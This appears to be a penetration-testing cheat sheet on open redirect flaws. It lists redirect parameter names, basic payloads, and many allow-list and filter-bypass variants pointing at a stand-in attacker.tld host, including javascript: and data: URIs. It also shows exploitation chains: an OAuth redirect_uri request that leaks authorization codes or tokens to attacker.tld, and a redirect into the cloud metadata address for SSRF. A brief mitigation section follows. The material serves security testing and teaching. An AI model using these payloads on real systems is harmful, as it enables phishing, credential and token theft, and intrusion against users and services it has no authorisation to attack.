# Open Redirect

> An Open Redirect occurs when the application accepts a user-controlled URL and forwards the user to it without validation. It is most impactful when chained with OAuth / SSO flows or for phishing.

## Summary

- [Common Parameters](#common-parameters)
- [Basic Payloads](#basic-payloads)
- [Filter Bypass](#filter-bypass)
- [Impact via Chains](#impact-via-chains)
- [Mitigation](#mitigation)
- [References](#references)

## Common Parameters

```
?next=
?url=
?target=
?rurl=
?dest=
?destination=
?redir=
?redirect_uri=
?redirect_url=
?redirect=
?out=
?view=
?to=
?image_url=
?go=
?return=
?returnTo=
?return_to=
?checkout_url=
?continue=
?return_path=
?callback=
?retUrl=
?login_url=
```

## Basic Payloads

```
https://attacker.tld
//attacker.tld
//attacker.tld/path
/\attacker.tld
\/attacker.tld
//google.com%2f@attacker.tld
//attacker.tld%2F.target.tld
```

## Filter Bypass

### Domain whitelist bypass via subdomain

If `target.tld` is allow-listed:

```
//attacker.tld?target.tld
//target.tld.attacker.tld
//target.tld@attacker.tld
//attacker.tld#target.tld
//attacker.tld?.target.tld
//attacker.tld/target.tld
```

### Backslash tricks

```
\/\/attacker.tld
/\attacker.tld
//\@attacker.tld
\/\/target.tld\@attacker.tld
```

### Encoded slashes

```
%2F%2Fattacker.tld
%5C%5Cattacker.tld
%09//attacker.tld
%0d%0a//attacker.tld
//attacker%E3%80%82tld     <- ideographic full stop
//attacker。tld
```

### Userinfo abuse

```
https://target.tld@attacker.tld/
https://target.tld:passwd@attacker.tld/
```

### Path appended scheme

If the app prepends `https://target.tld/`:

```
//attacker.tld
/\attacker.tld
.attacker.tld           (becomes https://target.tld.attacker.tld/)
```

### JS-only redirect via fragment

```
javascript:alert(1)
java%0d%0ascript:alert(1)
data:text/html,<script>location='https://attacker.tld'</script>
```

## Impact via Chains

### OAuth `redirect_uri`

Open redirect on a whitelisted host lets attackers exfiltrate `code` / `token`:

```
GET /oauth/authorize?client_id=...&redirect_uri=https://allowed.tld/redirect?next=https://attacker.tld
```

The `code` arrives at `allowed.tld`, which redirects to `attacker.tld` while keeping the query string → token leak.

### Cookie scoping abuse

Redirect victim to attacker site that sets a cookie on `*.target.tld` (if subdomain takeover or similar).

### Phishing

A link that genuinely starts with `https://target.tld/` is far more trustworthy in emails / SMS.

### Bypassing SSRF / CSRF protections

A backend that follows redirects can be tricked: a request to `target.tld/redirect?url=http://169.254.169.254/...` may be allowed but resolve to metadata.

## Mitigation

- Strict **allow-list** of relative paths (`/dashboard`, `/profile`).
- If full URLs are needed, parse and require the **host to be in an allow-list** (after canonicalization).
- For OAuth, use **exact-match** registered `redirect_uri`s — no wildcards.
- Display an **interstitial page** when redirecting cross-origin.

## References

- [OWASP — Unvalidated Redirects and Forwards](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [PortSwigger — Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
